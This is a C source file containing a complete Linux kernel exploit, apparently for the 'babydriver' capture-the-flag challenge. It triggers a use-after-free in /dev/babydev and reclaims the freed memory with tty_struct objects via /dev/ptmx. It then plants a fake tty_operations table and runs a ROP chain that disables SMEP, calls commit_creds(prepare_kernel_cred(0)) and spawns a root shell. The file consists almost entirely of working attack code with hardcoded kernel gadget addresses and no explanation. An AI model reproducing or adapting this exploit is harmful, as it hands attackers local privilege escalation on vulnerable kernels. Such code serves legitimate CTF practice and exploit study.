#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sched.h>
#include <errno.h>
#include <pty.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/sem.h>

#define COMMAND 0x10001

#define ALLOC_NUM 50

struct tty_operations
{
    struct tty_struct *(*lookup)(struct tty_driver *, struct file *, int); /*     0     8 */
    int (*install)(struct tty_driver *, struct tty_struct *);              /*     8     8 */
    void (*remove)(struct tty_driver *, struct tty_struct *);              /*    16     8 */
    int (*open)(struct tty_struct *, struct file *);                       /*    24     8 */
    void (*close)(struct tty_struct *, struct file *);                     /*    32     8 */
    void (*shutdown)(struct tty_struct *);                                 /*    40     8 */
    void (*cleanup)(struct tty_struct *);                                  /*    48     8 */
    int (*write)(struct tty_struct *, const unsigned char *, int);         /*    56     8 */
    /* --- cacheline 1 boundary (64 bytes) --- */
    int (*put_char)(struct tty_struct *, unsigned char);                            /*    64     8 */
    void (*flush_chars)(struct tty_struct *);                                       /*    72     8 */
    int (*write_room)(struct tty_struct *);                                         /*    80     8 */
    int (*chars_in_buffer)(struct tty_struct *);                                    /*    88     8 */
    int (*ioctl)(struct tty_struct *, unsigned int, long unsigned int);             /*    96     8 */
    long int (*compat_ioctl)(struct tty_struct *, unsigned int, long unsigned int); /*   104     8 */
    void (*set_termios)(struct tty_struct *, struct ktermios *);                    /*   112     8 */
    void (*throttle)(struct tty_struct *);                                          /*   120     8 */
    /* --- cacheline 2 boundary (128 bytes) --- */
    void (*unthrottle)(struct tty_struct *);           /*   128     8 */
    void (*stop)(struct tty_struct *);                 /*   136     8 */
    void (*start)(struct tty_struct *);                /*   144     8 */
    void (*hangup)(struct tty_struct *);               /*   152     8 */
    int (*break_ctl)(struct tty_struct *, int);        /*   160     8 */
    void (*flush_buffer)(struct tty_struct *);         /*   168     8 */
    void (*set_ldisc)(struct tty_struct *);            /*   176     8 */
    void (*wait_until_sent)(struct tty_struct *, int); /*   184     8 */
    /* --- cacheline 3 boundary (192 bytes) --- */
    void (*send_xchar)(struct tty_struct *, char);                           /*   192     8 */
    int (*tiocmget)(struct tty_struct *);                                    /*   200     8 */
    int (*tiocmset)(struct tty_struct *, unsigned int, unsigned int);        /*   208     8 */
    int (*resize)(struct tty_struct *, struct winsize *);                    /*   216     8 */
    int (*set_termiox)(struct tty_struct *, struct termiox *);               /*   224     8 */
    int (*get_icount)(struct tty_struct *, struct serial_icounter_struct *); /*   232     8 */
    const struct file_operations *proc_fops;                                 /*   240     8 */

    /* size: 248, cachelines: 4, members: 31 */
    /* last cacheline: 56 bytes */
};

typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds = 0xffffffff810a1420;
_prepare_kernel_cred prepare_kernel_cred = 0xffffffff810a1810;
unsigned long native_write_cr4 = 0xFFFFFFFF810635B0;
unsigned long xchgeaxesp = 0xFFFFFFFF81007808;
unsigned long poprdiret = 0xFFFFFFFF813E7D6F;
unsigned long iretq = 0xFFFFFFFF8181A797;
unsigned long swapgs = 0xFFFFFFFF81063694;


void get_root_payload(void)
{
    commit_creds(prepare_kernel_cred(0));
}

void get_shell()
{
    printf("is system?\n");
    char *shell = "/bin/sh";
    char *args[] = {shell, NULL};
    execve(shell, args, NULL);
}

struct tty_operations fake_ops;

char fake_procfops[1024];

unsigned long user_cs, user_ss, user_rflags;

static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags)
        :
        : "memory");
}

void set_affinity(int which_cpu)
{
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(which_cpu, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0)
    {
        perror("sched_setaffinity()");
        exit(EXIT_FAILURE);
    }
}

int main()
{

    int fd = 0;
    int fd1 = 0;
    int cmd;
    int arg = 0;
    char Buf[4096];
    int result;
    int j;
    struct tty_struct *tty;
    int m_fd[ALLOC_NUM],s_fd[ALLOC_NUM];
    int i,len;
    unsigned long lower_addr;
    unsigned long base; 
    char buff2[0x300];

    save_state();
    set_affinity(0);
    memset(&fake_ops, 0, sizeof(fake_ops));
    memset(fake_procfops, 0, sizeof(fake_procfops));
    fake_ops.proc_fops = &fake_procfops;
    fake_ops.ioctl = xchgeaxesp;
    //open two babydev
    printf("Open two babydev\n");
    fd = open("/dev/babydev",O_RDWR);
    fd1 = open("/dev/babydev",O_RDWR);

    //init babydev_struct
    printf("Init buffer for tty_struct,%d\n",sizeof(tty));
    ioctl(fd,COMMAND,0x2e0);
    ioctl(fd1,COMMAND,0x2e0);

    //race condition
    printf("Free buffer 1st\n");
    close(fd);

    printf("Try to occupy tty_struct\n");
    for(i=0;i<ALLOC_NUM;i++)
    {
    m_fd[i] = open("/dev/ptmx",O_RDWR|O_NOCTTY);
    if(m_fd[i] == -1)
    {
        printf("The %d pmtx error\n",i);
    }
    }

    printf("Let's debug it\n");
    lower_addr = xchgeaxesp & 0xFFFFFFFF;
    base = lower_addr & ~0xFFF;
    if (mmap(base, 0x30000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) != base)
    {
        perror("mmap");
        exit(1);
    }
        unsigned long rop_chain[]= {
        poprdiret,
        0x6f0, // cr4 with smep disabled
        native_write_cr4,
        get_root_payload,
        swapgs,
        0, // dummy
        iretq,
        get_shell,
        user_cs, user_rflags, base + 0x10000, user_ss};
    memcpy(lower_addr, rop_chain, sizeof(rop_chain));

    //uaf here

    len = read(fd1, buff2, 0x20);
    if(len == -1)
    {
        perror("read");
        exit(-1);
    }
    //printf("read len=%d\n", len);

    *(unsigned long long*)(buff2+3*8) = &fake_ops;

    len = write(fd1, buff2, 0x20);
    if(len == -1)
    {
        perror("write");
        exit(-1);
    }

    for(j =0; j < 4; j++)
    {
        printf("%p\n", *(unsigned long long*)(buff2+j*8));
    }

    printf("get shell\n");

    for(i = 0; i < 256; i++)
    {
        ioctl(m_fd[i], 0, 0);//FFFFFFFF814D8AED call rax
    }
}
